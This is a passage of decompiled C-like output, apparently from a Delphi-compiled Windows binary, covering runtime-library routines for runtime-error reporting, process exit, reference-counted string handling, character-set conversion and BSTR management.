  uVar2 = DAT_0043f004;
  do {
    s_Runtime_error_at_00000000_0043f094[uVar3 & 0xff] = (&DAT_0043f0b4)[uVar2 & 0xf];
    uVar2 = uVar2 >> 4;
    uVar3 = uVar3 - 1;
  } while (uVar2 != 0);
  return;
}



// WARNING: Unable to track spacebase fully for stack

bool FUN_004045fc(void)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  iVar1 = DAT_0043f000;
  DAT_0043f000 = 0;
  puVar3 = DAT_00442630;
  puVar4 = &DAT_00442630;
  for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  return (bool)('\x01' - (iVar1 != 0));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040462c(undefined4 param_1,undefined4 param_2,DWORD param_3)

{
  HANDLE pvVar1;
  char *lpBuffer;
  undefined *lpBuffer_00;
  DWORD DVar2;
  DWORD *lpNumberOfBytesWritten;
  DWORD *lpNumberOfBytesWritten_00;
  LPOVERLAPPED p_Var3;
  DWORD local_4;
  
  local_4 = param_3;
  if (DAT_00442044 != '\0') {
    if ((_DAT_00442218 == -0x284e) && (_DAT_00442220 != 0)) {
      (*DAT_00442230)(&DAT_00442214);
    }
    lpNumberOfBytesWritten = &local_4;
    lpNumberOfBytesWritten_00 = &local_4;
    p_Var3 = (LPOVERLAPPED)0x0;
    DVar2 = 0x1e;
    lpBuffer = s_Runtime_error_at_00000000_0043f094;
    pvVar1 = GetStdHandle(0xfffffff5);
    WriteFile(pvVar1,lpBuffer,DVar2,lpNumberOfBytesWritten,p_Var3);
    p_Var3 = (LPOVERLAPPED)0x0;
    DVar2 = 2;
    lpBuffer_00 = &DAT_004046b4;
    pvVar1 = GetStdHandle(0xfffffff5);
    WriteFile(pvVar1,lpBuffer_00,DVar2,lpNumberOfBytesWritten_00,p_Var3);
    return;
  }
  if (DAT_0043f034 == '\0') {
    MessageBoxA((HWND)0x0,s_Runtime_error_at_00000000_0043f094,s_Error_0043f08c,0);
  }
  return;
}



void FUN_004046b8(void)

{
  HMODULE hLibModule;
  code *pcVar1;
  undefined4 uVar2;
  DWORD extraout_ECX;
  undefined *extraout_ECX_00;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 *puVar4;
  undefined4 *puVar5;
  byte bVar6;
  
  bVar6 = 0;
  if ((DAT_00442658 == 0) && (DAT_00442040 != (code *)0x0)) {
    do {
      pcVar1 = DAT_00442040;
      DAT_00442040 = (code *)0x0;
      (*pcVar1)();
    } while (DAT_00442040 != (code *)0x0);
  }
  if (DAT_0043f004 != 0) {
    uVar2 = FUN_004045a0();
    FUN_0040462c(uVar2,extraout_EDX,extraout_ECX);
    DAT_0043f004 = 0;
  }
  while( true ) {
    if ((DAT_00442658 == 2) && (DAT_0043f000 == 0)) {
      DAT_0044263c = 0;
    }
    FUN_00404454();
    if (((DAT_00442658 < 2) || (DAT_0043f000 != 0)) && (DAT_00442640 != (undefined4 *)0x0)) {
      FUN_00406088(DAT_00442640,extraout_EDX_00,extraout_ECX_00);
      hLibModule = (HMODULE)DAT_00442640[4];
      if ((hLibModule != (HMODULE)DAT_00442640[1]) && (hLibModule != (HMODULE)0x0)) {
        FreeLibrary(hLibModule);
      }
    }
    FUN_0040442c();
    if (DAT_00442658 == 1) {
      (*DAT_00442654)();
    }
    if (DAT_00442658 != 0) {
      FUN_004045fc();
    }
    if (DAT_00442630 == (undefined4 *)0x0) break;
    puVar4 = DAT_00442630;
    puVar5 = &DAT_00442630;
    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = *puVar4;
      puVar4 = puVar4 + (uint)bVar6 * -2 + 1;
      puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
    }
  }
  if (DAT_00442024 != (code *)0x0) {
    (*DAT_00442024)();
  }
                    // WARNING: Subroutine does not return
  ExitProcess(DAT_0043f000);
}



void FUN_00404790(undefined4 param_1)

{
  DAT_0043f000 = param_1;
  FUN_004046b8();
  return;
}



void FUN_0040479c(undefined4 param_1)

{
  undefined4 in_stack_00000000;
  
  DAT_0043f004 = in_stack_00000000;
  FUN_00404790(param_1);
  return;
}



int * FUN_004047a8(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004026c8(iVar2 + -8);
    }
  }
  return param_1;
}



void FUN_004047cc(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  do {
    iVar2 = *param_1;
    if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
      LOCK();
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004026c8(iVar2 + -8);
      }
    }
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return;
}



void FUN_004047fc(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar3 = FUN_0040486c(param_2[-1]);
      FUN_0040285c(param_2,puVar3,param_2[-1]);
      param_2 = puVar3;
    }
    else {
      LOCK();
      param_2[-2] = param_2[-2] + 1;
    }
  }
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004026c8(iVar2 + -8);
    }
  }
  return;
}



void FUN_00404840(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  if ((param_2 != 0) &&
     (iVar2 = *(int *)(param_2 + -8), iVar2 != -1 && SCARRY4(iVar2,1) == iVar2 + 1 < 0)) {
    LOCK();
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
  }
  iVar2 = *param_1;
  *param_1 = param_2;
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004026c8(iVar2 + -8);
    }
  }
  return;
}



undefined4 * FUN_0040486c(int param_1)

{
  uint uVar1;
  undefined4 *puVar2;
  
  if (0 < param_1) {
    uVar1 = param_1 + 10U & 0xfffffffe;
    puVar2 = (undefined4 *)FUN_004026a8(uVar1);
    *(undefined2 *)((uVar1 - 2) + (int)puVar2) = 0;
    puVar2[1] = param_1;
    *puVar2 = 1;
    return puVar2 + 2;
  }
  return (undefined4 *)0x0;
}



void FUN_00404898(int *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  
  puVar1 = FUN_0040486c(param_3);
  if (param_2 != (undefined4 *)0x0) {
    FUN_0040285c(param_2,puVar1,param_3);
  }
  FUN_004047a8(param_1);
  *param_1 = (int)puVar1;
  return;
}



void FUN_004048c8(LPSTR param_1,int param_2,LPCWSTR param_3,int param_4)

{
  WideCharToMultiByte(DAT_004425b8,0,param_3,param_4,param_1,param_2,(LPCSTR)0x0,(LPBOOL)0x0);
  return;
}



void FUN_004048e8(LPWSTR param_1,int param_2,LPCSTR param_3,int param_4)

{
  MultiByteToWideChar(DAT_004425b8,0,param_3,param_4,param_1,param_2);
  return;
}



void FUN_00404904(LPSTR *param_1,LPCWSTR param_2,int param_3)

{
  uint uVar1;
  LPSTR *local_1010 [1024];
  
  local_1010[0] = param_1;
  if (param_3 < 1) {
    FUN_004047a8((int *)param_1);
  }
  else {
    if ((param_3 + 1 < 0x7ff) &&
       (uVar1 = FUN_004048c8((LPSTR)local_1010,0xfff,param_2,param_3), -1 < (int)uVar1)) {
      FUN_00404898((int *)param_1,local_1010,uVar1);
      return;
    }
    uVar1 = (param_3 + 1) * 2;
    FUN_00404d98((int *)param_1,uVar1);
    uVar1 = FUN_004048c8(*param_1,uVar1,param_2,param_3);
    if ((int)uVar1 < 0) {
      uVar1 = 0;
    }
    FUN_00404d98((int *)param_1,uVar1);
  }
  return;
}



void FUN_00404990(int *param_1,undefined4 param_2)

{
  undefined4 local_4;
  
  local_4 = param_2;
  FUN_00404898(param_1,&local_4,1);
  return;
}



void FUN_004049a0(int *param_1,undefined4 *param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  
  uVar1 = 0;
  puVar2 = param_2;
  if (param_2 != (undefined4 *)0x0) {
    for (; *(char *)puVar2 != '\0'; puVar2 = puVar2 + 1) {
      if (*(char *)((int)puVar2 + 1) == '\0') {
LAB_004049c1:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        break;
      }
      if (*(char *)((int)puVar2 + 2) == '\0') {
LAB_004049c0:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_004049c1;
      }
      if (*(char *)((int)puVar2 + 3) == '\0') {
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_004049c0;
      }
    }
    uVar1 = (int)puVar2 - (int)param_2;
  }
  FUN_00404898(param_1,param_2,uVar1);
  return;
}



void FUN_004049d0(LPSTR *param_1,LPCWSTR param_2)

{
  uint uVar1;
  LPCWSTR pWVar2;
  
  uVar1 = 0;
  pWVar2 = param_2;
  if (param_2 != (LPCWSTR)0x0) {
    for (; *pWVar2 != L'\0'; pWVar2 = pWVar2 + 4) {
      if (pWVar2[1] == L'\0') {
LAB_004049f9:
        pWVar2 = pWVar2 + 1;
        break;
      }
      if (pWVar2[2] == L'\0') {
LAB_004049f6:
        pWVar2 = pWVar2 + 1;
        goto LAB_004049f9;
      }
      if (pWVar2[3] == L'\0') {
        pWVar2 = pWVar2 + 1;
        goto LAB_004049f6;
      }
    }
    uVar1 = (uint)((int)pWVar2 - (int)param_2) >> 1;
  }
  FUN_00404904(param_1,param_2,uVar1);
  return;
}



void FUN_00404a0c(int *param_1,byte *param_2)

{
  FUN_00404898(param_1,(undefined4 *)(param_2 + 1),(uint)*param_2);
  return;
}



void FUN_00404a18(int *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  bool bVar3;
  
  bVar3 = true;
  uVar1 = param_3;
  puVar2 = param_2;
  do {
    if (uVar1 == 0) break;
    uVar1 = uVar1 - 1;
    bVar3 = *(char *)puVar2 == '\0';
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (!bVar3);
  if (bVar3) {
    uVar1 = ~uVar1;
  }
  FUN_00404898(param_1,param_2,uVar1 + param_3);
  return;
}



void FUN_00404a30(LPSTR *param_1,LPCWSTR param_2)

{
  uint uVar1;
  
  uVar1 = 0;
  if (param_2 != (LPCWSTR)0x0) {
    uVar1 = *(uint *)(param_2 + -2) >> 1;
  }
  FUN_00404904(param_1,param_2,uVar1);
  return;
}



int FUN_00404a68(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



void FUN_00404a70(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  uint uVar5;
  
  if (param_2 == (undefined4 *)0x0) {
    return;
  }
  puVar4 = (undefined4 *)*param_1;
  if (puVar4 != (undefined4 *)0x0) {
    uVar3 = puVar4[-1];
    if (param_2 == puVar4) {
      FUN_00404d98(param_1,param_2[-1] + uVar3);
      param_2 = (undefined4 *)*param_1;
      uVar5 = uVar3;
    }
    else {
      FUN_00404d98(param_1,param_2[-1] + uVar3);
      uVar5 = param_2[-1];
    }
    FUN_0040285c(param_2,(undefined4 *)(*param_1 + uVar3),uVar5);
    return;
  }
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar4 = FUN_0040486c(param_2[-1]);
      FUN_0040285c(param_2,puVar4,param_2[-1]);
      param_2 = puVar4;
    }
    else {
      LOCK();
      param_2[-2] = param_2[-2] + 1;
    }
  }
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004026c8(iVar2 + -8);
    }
  }
  return;
}



void FUN_00404ab4(int *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 == (undefined4 *)0x0) {
    FUN_004047fc(param_1,param_3);
    return;
  }
  if (param_3 == (undefined4 *)0x0) {
    if (param_2 != (undefined4 *)0x0) {
      iVar2 = param_2[-2];
      if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
        puVar3 = FUN_0040486c(param_2[-1]);
        FUN_0040285c(param_2,puVar3,param_2[-1]);
        param_2 = puVar3;
      }
      else {
        LOCK();
        param_2[-2] = param_2[-2] + 1;
      }
    }
    iVar2 = *param_1;
    *param_1 = (int)param_2;
    if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
      LOCK();
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004026c8(iVar2 + -8);
      }
    }
    return;
  }
  if (param_2 == (undefined4 *)*param_1) {
    FUN_00404a70(param_1,param_3);
    return;
  }
  if (param_3 != (undefined4 *)*param_1) {
    FUN_004047fc(param_1,param_2);
    FUN_00404a70(param_1,param_3);
    return;
  }
  puVar3 = FUN_0040486c(param_2[-1] + param_3[-1]);
  FUN_0040285c(param_2,puVar3,param_2[-1]);
  FUN_0040285c(param_3,(undefined4 *)((int)puVar3 + param_2[-1]),param_3[-1]);
  if (puVar3 != (undefined4 *)0x0) {
    puVar3[-2] = puVar3[-2] + -1;
  }
  FUN_004047fc(param_1,puVar3);
  return;
}



void FUN_00404b28(int **param_1,int param_2)

{
  int **ppiVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  int *piVar5;
  int **ppiVar6;
  code *UNRECOVERED_JUMPTABLE;
  int *piStack24;
  
  ppiVar6 = (int **)0x0;
  ppiVar1 = *(int ***)(&stack0x00000000 + param_2 * 4);
  if ((ppiVar1 == (int **)0x0) || ((int **)*param_1 != ppiVar1)) {
    piVar3 = (int *)0x0;
    iVar4 = param_2;
  }
  else {
    piVar3 = ppiVar1[-1];
    iVar4 = param_2 + -1;
    ppiVar6 = ppiVar1;
  }
  do {
    ppiVar1 = *(int ***)(&stack0x00000000 + iVar4 * 4);
    if ((ppiVar1 != (int **)0x0) &&
       (piVar3 = (int *)((int)piVar3 + (int)ppiVar1[-1]), ppiVar6 == ppiVar1)) {
      ppiVar6 = (int **)0x0;
    }
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  if (ppiVar6 == (int **)0x0) {
    piVar3 = FUN_0040486c((int)piVar3);
    piStack24 = piVar3;
  }
  else {
    piVar5 = ppiVar6[-1];
    FUN_00404d98((int *)param_1,(uint)piVar3);
    param_2 = param_2 + -1;
    piVar3 = (int *)((int)piVar5 + (int)*param_1);
    ppiVar6 = param_1;
    piStack24 = *param_1;
  }
  do {
    puVar2 = *(undefined4 **)(&stack0x00000000 + param_2 * 4);
    piVar5 = piVar3;
    if (puVar2 != (undefined4 *)0x0) {
      piVar5 = (int *)((int)piVar3 + puVar2[-1]);
      FUN_0040285c(puVar2,piVar3,puVar2[-1]);
    }
    param_2 = param_2 + -1;
    piVar3 = piVar5;
  } while (param_2 != 0);
  if (ppiVar6 == (int **)0x0) {
    if (piStack24 != (int *)0x0) {
      piStack24[-2] = piStack24[-2] + -1;
    }
    FUN_004047fc((int *)param_1,piStack24);
  }
                    // WARNING: Could not recover jumptable at 0x00404baf. Too many branches
                    // WARNING: Treating indirect jump as call
  (*UNRECOVERED_JUMPTABLE)(UNRECOVERED_JUMPTABLE);
  return;
}



uint * FUN_00404bb4(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 != param_2) {
    if (param_1 == (uint *)0x0) {
      param_1 = (uint *)-param_2[-1];
    }
    else if (param_2 == (uint *)0x0) {
      param_1 = (uint *)param_1[-1];
    }
    else {
      uVar3 = param_2[-1];
      puVar2 = (uint *)(param_1[-1] - uVar3);
      if (param_1[-1] < uVar3 || puVar2 == (uint *)0x0) {
        uVar3 = uVar3 + (int)puVar2;
      }
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 2) {
        if (*param_1 != *param_2) {
          return puVar2;
        }
        if (uVar4 == 1) {
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          break;
        }
        if (param_1[1] != param_2[1]) {
          return puVar2;
        }
        param_1 = param_1 + 2;
        param_2 = param_2 + 2;
      }
      uVar3 = uVar3 & 3;
      if (uVar3 != 0) {
        uVar4 = *param_1;
        uVar1 = *param_2;
        if ((char)uVar4 != (char)uVar1) {
          return puVar2;
        }
        if (uVar3 != 1) {
          if ((char)(uVar4 >> 8) != (char)(uVar1 >> 8)) {
            return puVar2;
          }
          if ((uVar3 != 2) && ((uVar4 & 0xff0000) != (uVar1 & 0xff0000))) {
            return puVar2;
          }
        }
      }
      param_1 = (uint *)((int)puVar2 * 2);
    }
  }
  return param_1;
}



void FUN_00404c58(int param_1)

{
  int iVar1;
  
  if ((param_1 != 0) &&
     (iVar1 = *(int *)(param_1 + -8), iVar1 != -1 && SCARRY4(iVar1,1) == iVar1 + 1 < 0)) {
    LOCK();
    *(int *)(param_1 + -8) = *(int *)(param_1 + -8) + 1;
  }
  return;
}



undefined * FUN_00404c68(undefined *param_1)

{
  if (param_1 != (undefined *)0x0) {
    return param_1;
  }
  return &DAT_00404c6d;
}



int FUN_00404c74(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040486c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_0040285c(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004026c8((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00404c74(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040486c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_0040285c(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004026c8((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00404c74(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040486c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_0040285c(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004026c8((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



void FUN_00404cc8(int param_1,int param_2,uint param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  
  if ((param_1 != 0) && (iVar1 = *(int *)(param_1 + -4), iVar1 != 0)) {
    iVar2 = param_2 + -1;
    if (param_2 < 1) {
      iVar2 = 0;
    }
    else if (iVar1 <= iVar2) goto LAB_00404cfa;
    if (-1 < (int)param_3) {
      if (iVar1 - iVar2 < (int)param_3) {
        param_3 = iVar1 - iVar2;
      }
      FUN_00404898(param_4,(undefined4 *)(iVar2 + param_1),param_3);
      return;
    }
  }
LAB_00404cfa:
  FUN_004047a8(param_4);
  return;
}



void FUN_00404d08(int *param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  thunk_FUN_00404c74(param_1);
  iVar1 = *param_1;
  if (iVar1 != 0) {
    iVar3 = param_2 + -1;
    if (((0 < param_2) && (iVar3 < *(int *)(iVar1 + -4))) && (0 < param_3)) {
      iVar2 = *(int *)(iVar1 + -4) - iVar3;
      if (iVar2 < param_3) {
        param_3 = iVar2;
      }
      FUN_0040285c((undefined4 *)(param_3 + (int)(undefined4 *)(iVar1 + iVar3)),
                   (undefined4 *)(iVar1 + iVar3),iVar2 - param_3);
      FUN_00404d98(param_1,*(int *)(*param_1 + -4) - param_3);
    }
  }
  return;
}



char * FUN_00404d50(char *param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  bool bVar7;
  
  if (param_1 != (char *)0x0) {
    if (param_2 == (char *)0x0) {
      return (char *)0x0;
    }
    iVar3 = *(int *)(param_1 + -4) + -1;
    if (-1 < iVar3) {
      iVar1 = *(int *)(param_2 + -4) - iVar3;
      bVar7 = iVar1 == 0;
      pcVar5 = param_2;
      if (!bVar7 && iVar3 <= *(int *)(param_2 + -4)) {
LAB_00404d70:
        do {
          if (iVar1 != 0) {
            iVar1 = iVar1 + -1;
            pcVar4 = pcVar5 + 1;
            bVar7 = *param_1 == *pcVar5;
            pcVar5 = pcVar4;
            if (!bVar7) goto LAB_00404d70;
          }
          iVar2 = iVar3;
          pcVar4 = param_1 + 1;
          pcVar6 = pcVar5;
          if (!bVar7) break;
          do {
            if (iVar2 == 0) break;
            bVar7 = *pcVar4 == *pcVar6;
            iVar2 = iVar2 + -1;
            pcVar4 = pcVar4 + 1;
            pcVar6 = pcVar6 + 1;
          } while (bVar7);
          if (bVar7) {
            return pcVar5 + -(int)param_2;
          }
        } while( true );
      }
    }
    param_1 = (char *)0x0;
  }
  return param_1;
}



void FUN_00404d98(int *param_1,uint param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iStack16;
  
  puVar3 = (undefined4 *)0x0;
  if (0 < (int)param_2) {
    iStack16 = *param_1;
    if ((iStack16 != 0) && (*(int *)(iStack16 + -8) == 1)) {
      iStack16 = iStack16 + -8;
      FUN_004026e8(&iStack16,param_2 + 9);
      *param_1 = iStack16 + 8;
      *(uint *)(iStack16 + 4) = param_2;
      *(undefined *)(param_2 + iStack16 + 8) = 0;
      return;
    }
    iStack16 = 0x404dd5;
    puVar3 = FUN_0040486c(param_2);
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 != (undefined4 *)0x0) {
      uVar2 = puVar1[-1];
      if ((int)param_2 <= (int)puVar1[-1]) {
        uVar2 = param_2;
      }
      iStack16 = 0x404ded;
      FUN_0040285c(puVar1,puVar3,uVar2);
    }
  }
  iStack16 = 0x404df4;
  FUN_004047a8(param_1);
  *param_1 = (int)puVar3;
  return;
}



void FUN_00404dfc(undefined *param_1,undefined *param_2)

{
  FUN_00404e04(param_1,param_2,0);
  return;
}



void FUN_00404e04(undefined *param_1,undefined *param_2,int param_3)

{
  undefined *puVar1;
  int iVar2;
  
  iVar2 = 0;
  if (param_2 != (undefined *)0x0) {
    iVar2 = *(int *)(param_2 + -4);
    param_3 = param_3 - iVar2;
  }
  puVar1 = FUN_00403590(param_1,param_3);
  FUN_0040353c(puVar1,param_2,iVar2);
  return;
}



void FUN_00404e2c(UINT param_1)

{
  BSTR pOVar1;
  
  if (param_1 != 0) {
    pOVar1 = SysAllocStringLen((OLECHAR *)0x0,param_1);
    if (pOVar1 == (BSTR)0x0) {
      FUN_004027b0(1);
      return;
    }
  }
  return;
}



void FUN_00404e44(BSTR *param_1,BSTR param_2)

{
  BSTR bstrString;
  
  bstrString = *param_1;
  *param_1 = param_2;
  if (bstrString != (BSTR)0x0) {
    SysFreeString(bstrString);
  }
  return;
}



BSTR * FUN_00404e54(BSTR *param_1)

{
  BSTR bstrString;
  
  bstrString = *param_1;
  if (bstrString != (BSTR)0x0) {
    *param_1 = (BSTR)0x0;
    SysFreeString(bstrString);
  }
  return param_1;
}



void FUN_00404e6c(BSTR *param_1,int param_2)

{
  BSTR bstrString;
  
  do {
    bstrString = *param_1;
    if (bstrString != (BSTR)0x0) {
      *param_1 = (BSTR)0x0;
      SysFreeString(bstrString);
    }
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return;
}



BSTR * FUN_00404e90(BSTR *param_1,OLECHAR *param_2)

{
  BSTR bstrString;
  BSTR *ppOVar1;
  
  if ((param_2 != (OLECHAR *)0x0) && (*(uint *)(param_2 + -2) >> 1 != 0)) {
    ppOVar1 = (BSTR *)SysReAllocStringLen(param_1,param_2,*(uint *)(param_2 + -2) >> 1);
    if (ppOVar1 != (BSTR *)0x0) {
      return ppOVar1;
    }
    ppOVar1 = (BSTR *)FUN_004027b0(1);
    return ppOVar1;
  }
  bstrString = *param_1;
  if (bstrString != (BSTR)0x0) {
    *param_1 = (BSTR)0x0;
    SysFreeString(bstrString);
  }
  return param_1;
}



void FUN_00404eb4(BSTR *param_1,LPCSTR param_2,int param_3)

{
  UINT UVar1;
  UINT UVar2;
  BSTR *local_1010 [1024];
  
  local_1010[0] = param_1;
  if (param_3 < 1) {
    FUN_00404e54(param_1);
  }
  else {
    UVar2 = param_3 + 1;
    if (((int)UVar2 < 0x7ff) &&
       (UVar1 = FUN_004048e8((LPWSTR)local_1010,0x7ff,param_2,param_3), 0 < (int)UVar1)) {
      FUN_00404f40(param_1,(OLECHAR *)local_1010,UVar1);
      return;
    }
    FUN_0040509c(param_1,UVar2);
    UVar2 = FUN_004048e8(*param_1,UVar2,param_2,param_3);
    if ((int)UVar2 < 0) {
      UVar2 = 0;
    }
    FUN_0040509c(param_1,UVar2);
  }
  return;
}



BSTR * FUN_00404f40(BSTR *param_1,OLECHAR *param_2,UINT param_3)

{
  BSTR pOVar1;
  BSTR *ppOVar2;
  
  if (param_3 == 0) {
    pOVar1 = *param_1;
    if (pOVar1 != (BSTR)0x0) {
      *param_1 = (BSTR)0x0;
      SysFreeString(pOVar1);
    }
    return param_1;
  }
  ppOVar2 = (BSTR *)SysAllocStringLen(param_2,param_3);
  if (ppOVar2 != (BSTR *)0x0) {
    pOVar1 = *param_1;
    *param_1 = (BSTR)ppOVar2;
    SysFreeString(pOVar1);
    return ppOVar2;
  }
  ppOVar2 = (BSTR *)FUN_004027b0(1);
  return ppOVar2;
}



void FUN_00404f64(BSTR *param_1,OLECHAR *param_2)

{
  UINT UVar1;
  OLECHAR *pOVar2;
  
  UVar1 = 0;
  pOVar2 = param_2;
  if (param_2 != (OLECHAR *)0x0) {
    for (; *pOVar2 != L'\0'; pOVar2 = pOVar2 + 4) {
      if (pOVar2[1] == L'\0') {
LAB_00404f8d:
        pOVar2 = pOVar2 + 1;
        break;
      }
      if (pOVar2[2] == L'\0') {
LAB_00404f8a:
        pOVar2 = pOVar2 + 1;
        goto LAB_00404f8d;
      }
      if (pOVar2[3] == L'\0') {
        pOVar2 = pOVar2 + 1;
        goto LAB_00404f8a;
      }
    }
    UVar1 = (uint)((int)pOVar2 - (int)param_2) >> 1;
  }
  FUN_00404f40(param_1,param_2,UVar1);
  return;
}



void FUN_00404fa0(BSTR *param_1,LPCSTR param_2)

{
  int iVar1;
  
  iVar1 = 0;
  if (param_2 != (LPCSTR)0x0) {
    iVar1 = *(int *)(param_2 + -4);
  }
  FUN_00404eb4(param_1,param_2,iVar1);
  return;
}



undefined * FUN_00404fb0(undefined *param_1)

{
  if (param_1 != (undefined *)0x0) {
    return param_1;
  }
  return &DAT_00404fb6;
}



uint FUN_00404fc0(uint param_1)

{
  if (param_1 != 0) {
    param_1 = *(uint *)(param_1 - 4) >> 1;
  }
  return param_1;
}



int * FUN_00404fcc(int *param_1,int *param_2)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  
  piVar1 = param_1;
  if (param_1 != param_2) {
    if (param_1 == (int *)0x0) {
      piVar1 = (int *)-param_2[-1];
    }
    else if (param_2 == (int *)0x0) {
      piVar1 = (int *)param_1[-1];
    }
    else {
      uVar2 = param_2[-1];
      piVar1 = (int *)(param_1[-1] - uVar2);
      if ((uint)param_1[-1] < uVar2 || piVar1 == (int *)0x0) {
        uVar2 = uVar2 + (int)piVar1;
      }
      for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 2) {
        if (*param_1 != *param_2) {
          return piVar1;
        }
        if (uVar3 == 1) {
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          break;
        }
        if (param_1[1] != param_2[1]) {
          return piVar1;
        }
        param_1 = param_1 + 2;
        param_2 = param_2 + 2;
      }
      if (((uVar2 & 2) == 0) || (*(short *)param_1 == *(short *)param_2)) {
        piVar1 = (int *)((int)piVar1 * 2);
      }
    }
  }
  return piVar1;
}



